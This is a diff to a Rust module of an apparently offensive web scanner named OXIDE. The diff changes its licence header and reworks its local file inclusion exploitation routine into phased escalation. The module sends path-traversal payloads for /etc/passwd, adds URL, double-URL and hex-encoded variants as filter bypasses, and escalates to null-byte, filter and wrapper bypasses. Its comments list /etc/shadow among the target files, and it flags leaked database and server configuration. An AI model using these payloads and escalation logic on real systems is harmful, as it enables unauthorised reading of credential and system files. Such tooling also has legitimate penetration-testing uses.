@@ -16,24 +16,19 @@
 //
 //
 // ---------------------------------------------------------------------------
-//   WARNING / 警告 / 警告
+//   LICENSE / ライセンス — GNU General Public License v3 (GPL-3.0)
 // ---------------------------------------------------------------------------
-//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
-//  You are permitted to VIEW this code for educational and reference
-//  purposes only. You may NOT modify, distribute, sublicense, or create
-//  derivative works without explicit written permission from khaninkali
-//  and the HyperSecurityOffensiveLabs development team.
+//  This program is free software: you can redistribute it and/or modify
+//  it under the terms of the GNU General Public License as published by
+//  the Free Software Foundation, either version 3 of the License, or
+//  (at your option) any later version.
 //
-//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
-//  教育目的および参照目的での閲覧のみ許可されています
-//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
-//  書面による明示的な許可なく修正配布サブライセンス
-//  または二次的著作物の作成を禁止します
+//  This program is distributed in the hope that it will be useful,
+//  but WITHOUT ANY WARRANTY; without even the implied warranty of
+//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+//  GNU General Public License for more details.
 //
-//  本源代码是HyperSecurityOffensiveLabs的独家财产
-//  仅允许出于教育和参考目的查看未经khaninkali和
-//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
-//  禁止修改分发再许可或创建衍生作品
+//  OXIDE v8.7.2-community-edition — HyperSecurityOffensiveLabs
 // ---------------------------------------------------------------------------
 //
 //
@@ -44,7 +39,13 @@ use crate::detection::analyzer::Finding;
 use crate::payload::lfi::Lfi;
 use crate::utils::url::UrlUtil;
 use anyhow::Result;
-use std::sync::Arc;
+use regex::Regex;
+use std::sync::{Arc, OnceLock};
+
+fn mysql_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"(?i)\bmysql\b").expect("valid regex"))
+}
 
 //  LFI電脳検出戦略 / LFI detection techniques:
 //   ① Basic direct:   /etc/passwd, /proc/version, /etc/shadow (6 sensitive files)
@@ -64,6 +65,8 @@ pub struct LFIScanner {
     client: Arc<HttpClient>,
     findings: Vec<Finding>,
     exploitation_level: u8,
+    /// Suppress internal progress prints (live-bar worker mode).
+    silent: bool,
 }
 
 #[derive(Debug, Clone)]
@@ -93,37 +96,56 @@ impl LFIScanner {
             client,
             findings: Vec::new(),
             exploitation_level: exploitation_level.min(100),
+            silent: false,
         }
+    }
+
+    /// Suppress internal progress prints (used by live-bar workers).
+    pub fn set_silent(&mut self, silent: bool) {
+        self.silent = silent;
     }
 
     /// Perform comprehensive LFI exploitation
     pub async fn exploit_lfi(&mut self, target_url: &str, parameter: &str) -> Result<Vec<LFIResult>, Box<dyn std::error::Error + Send + Sync>> {
-        println!("[*] Starting LFI exploitation at level {}", self.exploitation_level);
+        if !self.silent {
+            println!("[*] Starting LFI exploitation at level {}", self.exploitation_level);
+        }
         let mut results = Vec::new();
 
-        // Test basic LFI
+        //  現代的 LFI パイプライン / progressive escalation:
+        //   Phase A  DETECT   — basic read + path traversal (cheap, high signal)
+        //   Phase B  BYPASS   — encoding/null-byte only when nothing confirmed
+        //   Phase C  ADVANCED — filter/wrapper bypasses at high exploitation
+        let mut any_hit = false;
+
+        // ---- Phase A ----
         let basic_result = self.test_basic_lfi(target_url, parameter).await?;
+        any_hit |= basic_result.file_read;
         results.push(basic_result);
 
-        // Test path traversal
         let path_result = self.test_path_traversal(target_url, parameter).await?;
+        any_hit |= path_result.file_read;
         results.push(path_result);
 
-        // Test encoding bypasses
-        let encoding_result = self.test_encoding_bypasses(target_url, parameter).await?;
-        results.push(encoding_result);
+        // ---- Phase B: only escalate when Phase A found nothing ----
+        if !any_hit && self.exploitation_level >= 40 {
+            let encoding_result = self.test_encoding_bypasses(target_url, parameter).await?;
+            any_hit |= encoding_result.file_read;
+            results.push(encoding_result);
 
-        // Test null byte injection
-        let null_byte_result = self.test_null_byte_injection(target_url, parameter).await?;
-        results.push(null_byte_result);
+            let null_byte_result = self.test_null_byte_injection(target_url, parameter).await?;
+            any_hit |= null_byte_result.file_read;
+            results.push(null_byte_result);
+        }
 
-        // Test filter bypasses
-        let filter_result = self.test_filter_bypasses(target_url, parameter).await?;
-        results.push(filter_result);
+        // ---- Phase C: heavy wrappers/filters for deep exploitation ----
+        if !any_hit && self.exploitation_level >= 60 {
+            let filter_result = self.test_filter_bypasses(target_url, parameter).await?;
+            results.push(filter_result);
 
-        // Test wrapper bypasses
-        let wrapper_result = self.test_wrapper_bypasses(target_url, parameter).await?;
-        results.push(wrapper_result);
+            let wrapper_result = self.test_wrapper_bypasses(target_url, parameter).await?;
+            results.push(wrapper_result);
+        }
 
         Ok(results)
     }
@@ -257,11 +279,24 @@ impl LFIScanner {
 
     /// Test path traversal techniques with reduced false positives
     async fn test_path_traversal(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
-        let path_payloads = vec![
+        let base_payloads = [
             "../../../etc/passwd",
             "../../../../etc/passwd",
             "../../../../../etc/passwd",
         ];
+        //  AI符号化変種 / PayloadMutator adds URL/double-URL/hex encodings —
+        //  classic traversal filter bypasses; detection unchanged.
+        let mut path_payloads: Vec<String> = base_payloads.iter().map(|s| s.to_string()).collect();
+        {
+            let mutator = crate::ai::payload_mutator::PayloadMutator::new();
+            for b in base_payloads {
+                let e1 = mutator.url_encode(b);
+                let e2 = mutator.double_url_encode(&e1);
+                let e3 = mutator.hex_encode(&e1);
+                path_payloads.push(e2);
+                path_payloads.push(e3);
+            }
+        }
 
         // Get baseline first
         let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
@@ -270,7 +305,7 @@ impl LFIScanner {
             Err(_) => String::new(),
         };
 
-        for payload in path_payloads {
+        for payload in &path_payloads {
             let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
             let request = HttpRequest::get(&test_url);
 
@@ -520,7 +555,7 @@ impl LFIScanner {
                        (result.file_content.contains("ServerRoot") || result.file_content.contains("DocumentRoot") || result.file_content.contains("httpd.conf")) {
                         sensitive_data.push("web_server_config".to_string());
                     }
-                    if regex::Regex::new(r"(?i)\bmysql\b").unwrap().is_match(&result.file_content) &&
+                    if mysql_re().is_match(&result.file_content) &&
                        (result.file_content.contains("DB_HOST") || result.file_content.contains("DB_NAME") || result.file_content.contains("database") || result.file_content.contains("host =")) {
                         sensitive_data.push("database_config".to_string());
                     }
